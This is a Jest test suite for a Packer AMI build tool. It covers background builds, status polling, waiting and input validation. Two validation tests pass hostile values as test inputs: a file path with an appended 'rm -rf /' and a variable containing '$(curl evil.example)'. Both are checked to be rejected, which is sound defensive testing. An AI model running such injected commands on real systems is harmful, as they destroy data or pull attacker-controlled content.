jest.mock('../run-command.js', () => ({
  getRepoRoot: () => '/repo',
  runCommand: jest.fn(),
}));

jest.mock('node:child_process', () => ({
  spawn: jest.fn(),
}));

import { EventEmitter } from 'node:events';
import { PassThrough } from 'node:stream';
import { spawn, type ChildProcess } from 'node:child_process';
import { runCommand } from '../run-command.js';
import {
  packerBuild,
  packerBuildStatus,
  packerBuildWait,
} from './packer-build.js';

const mockedRun = runCommand as jest.MockedFunction<typeof runCommand>;
const mockedSpawn = spawn as jest.MockedFunction<typeof spawn>;

const BUILD_LOG =
  "==> amazon-ebs.runner: AMI: ami-0abc1234def56789a\nBuild 'amazon-ebs.runner' finished after 2 minutes 5 seconds.\n";

const IMAGE_META_JSON = JSON.stringify({
  Images: [
    {
      Name: 'runner-ami',
      BlockDeviceMappings: [{ Ebs: { SnapshotId: 'snap-0abc123' } }],
      Tags: [{ Key: 'role', Value: 'runner' }],
    },
  ],
});

interface FakeChild {
  child: ChildProcess;
  finish: (code: number, log?: string) => void;
}

function fakeChild(): FakeChild {
  const emitter = new EventEmitter() as EventEmitter & {
    stdout: PassThrough;
    stderr: PassThrough;
    pid: number;
    kill: jest.Mock;
  };
  emitter.stdout = new PassThrough();
  emitter.stderr = new PassThrough();
  emitter.pid = 1234;
  emitter.kill = jest.fn();
  return {
    child: emitter as unknown as ChildProcess,
    finish(code: number, log = '') {
      if (log) emitter.stdout.write(log);
      emitter.stdout.end();
      emitter.stderr.end();
      setImmediate(() => emitter.emit('close', code));
    },
  };
}

function body(result: {
  content: Array<{ type: string; text?: string }>;
  isError?: boolean;
}): { parsed: Record<string, unknown>; isError: boolean } {
  const block = result.content[0];
  if (!block || block.type !== 'text' || !block.text)
    throw new Error('expected text block');
  return {
    parsed: JSON.parse(block.text) as Record<string, unknown>,
    isError: Boolean(result.isError),
  };
}

/** runCommand mock: packer init resolves empty, aws describe-images resolves meta. */
function mockCommands(): void {
  mockedRun.mockImplementation((command) =>
    Promise.resolve(command === 'aws' ? IMAGE_META_JSON : ''),
  );
}

beforeEach(() => {
  mockedRun.mockReset();
  mockedSpawn.mockReset();
});

describe('packerBuild input validation', () => {
  it('rejects an hclPath with shell metacharacters without invoking packer', async () => {
    const { parsed, isError } = body(
      await packerBuild({
        hclPath: 'x.pkr.hcl; rm -rf /',
        runInBackground: true,
      }),
    );
    expect(isError).toBe(true);
    expect(String(parsed.error)).toMatch(/Invalid hclPath/);
    expect(mockedRun).not.toHaveBeenCalled();
    expect(mockedSpawn).not.toHaveBeenCalled();
  });

  it('rejects a var value with shell metacharacters without invoking packer', async () => {
    const { parsed, isError } = body(
      await packerBuild({
        hclPath: 'x.pkr.hcl',
        vars: { ami_name: '$(curl evil.example)' },
        runInBackground: true,
      }),
    );
    expect(isError).toBe(true);
    expect(String(parsed.error)).toMatch(/disallowed characters/);
    expect(mockedRun).not.toHaveBeenCalled();
    expect(mockedSpawn).not.toHaveBeenCalled();
  });

  it('rejects a var name that is not a plain identifier', async () => {
    const { parsed, isError } = body(
      await packerBuild({
        hclPath: 'x.pkr.hcl',
        vars: { 'bad name': 'value' },
        runInBackground: true,
      }),
    );
    expect(isError).toBe(true);
    expect(String(parsed.error)).toMatch(/Invalid var name/);
    expect(mockedSpawn).not.toHaveBeenCalled();
  });

  it('accepts a Windows-style absolute hclPath', async () => {
    mockCommands();
    const fake = fakeChild();
    mockedSpawn.mockReturnValue(fake.child);

    const { parsed, isError } = body(
      await packerBuild({
        hclPath: 'D:\\repo\\terraform\\runners\\packer\\runner-ami.pkr.hcl',
        runInBackground: true,
      }),
    );
    expect(isError).toBe(false);
    expect(parsed.ok).toBe(true);
  });
});

describe('packerBuild', () => {
  it('returns immediately with a buildId when runInBackground=true', async () => {
    mockCommands();
    const fake = fakeChild();
    mockedSpawn.mockReturnValue(fake.child);

    const { parsed, isError } = body(
      await packerBuild({ hclPath: 'x.pkr.hcl', runInBackground: true }),
    );
    expect(isError).toBe(false);
    expect(parsed.ok).toBe(true);
    expect(String(parsed.buildId)).toMatch(/^packer-/);
    expect(String(parsed.message)).toMatch(/packer_build_status/);
  });

  it('returns a running snapshot with a re-arm hint when the build outlives the sync budget', async () => {
    mockCommands();
    const fake = fakeChild();
    mockedSpawn.mockReturnValue(fake.child);

    const { parsed, isError } = body(
      await packerBuild({ hclPath: 'x.pkr.hcl', maxWaitSeconds: 0 }),
    );
    expect(isError).toBe(false);
    expect(parsed.ok).toBe(true);
    expect(parsed.status).toBe('running');
    expect(String(parsed.hint)).toMatch(/packer_build_wait/);
  });

  it('returns the finished structured result when the build completes within the budget', async () => {
    mockCommands();
    mockedSpawn.mockImplementation(() => {
      const fake = fakeChild();
      setImmediate(() => fake.finish(0, BUILD_LOG));
      return fake.child;
    });

    const { parsed, isError } = body(
      await packerBuild({ hclPath: 'x.pkr.hcl', maxWaitSeconds: 10 }),
    );
    expect(isError).toBe(false);
    expect(parsed.ok).toBe(true);
    expect(parsed.status).toBe('done');
    expect(parsed.amiId).toBe('ami-0abc1234def56789a');
    expect(parsed.durationSec).toBe(125);
    expect(parsed.snapshotId).toBe('snap-0abc123');
  });

  it('surfaces a packer init failure as a failed build, not a hang', async () => {
    mockedRun.mockImplementation((command) =>
      command === 'packer'
        ? Promise.reject(new Error('plugin download failed'))
        : Promise.resolve(IMAGE_META_JSON),
    );

    const { parsed, isError } = body(
      await packerBuild({ hclPath: 'x.pkr.hcl', maxWaitSeconds: 10 }),
    );
    expect(isError).toBe(true);
    expect(parsed.ok).toBe(false);
    expect(String(parsed.error)).toMatch(/packer init failed/);
  });
});

describe('packerBuildWait', () => {
  it('errors on an unknown buildId', async () => {
    const { parsed, isError } = body(
      await packerBuildWait({ buildId: 'packer-nope' }),
    );
    expect(isError).toBe(true);
    expect(String(parsed.error)).toMatch(/not found/);
  });

  it('returns a non-error running snapshot when the wait cap expires', async () => {
    mockCommands();
    const fake = fakeChild();
    mockedSpawn.mockReturnValue(fake.child);

    const started = body(
      await packerBuild({ hclPath: 'x.pkr.hcl', runInBackground: true }),
    );
    const buildId = String(started.parsed.buildId);

    const { parsed, isError } = body(
      await packerBuildWait({ buildId, timeoutSec: 0 }),
    );
    expect(isError).toBe(false);
    expect(parsed.ok).toBe(true);
    expect(parsed.status).toBe('running');
    expect(String(parsed.hint)).toMatch(/packer_build_wait/);
  });

  it('returns the finished result once the build completes', async () => {
    mockCommands();
    const fake = fakeChild();
    mockedSpawn.mockImplementation(() => {
      setImmediate(() => fake.finish(0, BUILD_LOG));
      return fake.child;
    });

    const started = body(
      await packerBuild({ hclPath: 'x.pkr.hcl', runInBackground: true }),
    );
    const buildId = String(started.parsed.buildId);

    const { parsed, isError } = body(
      await packerBuildWait({ buildId, timeoutSec: 10, pollIntervalSec: 1 }),
    );
    expect(isError).toBe(false);
    expect(parsed.status).toBe('done');
    expect(parsed.amiId).toBe('ami-0abc1234def56789a');
  });
});

describe('packerBuildStatus', () => {
  it('reports running with elapsed time for an in-flight build', async () => {
    mockCommands();
    const fake = fakeChild();
    mockedSpawn.mockReturnValue(fake.child);

    const started = body(
      await packerBuild({ hclPath: 'x.pkr.hcl', runInBackground: true }),
    );
    const buildId = String(started.parsed.buildId);

    const { parsed, isError } = body(await packerBuildStatus({ buildId }));
    expect(isError).toBe(false);
    expect(parsed.status).toBe('running');
    expect(typeof parsed.elapsedSec).toBe('number');
  });
});
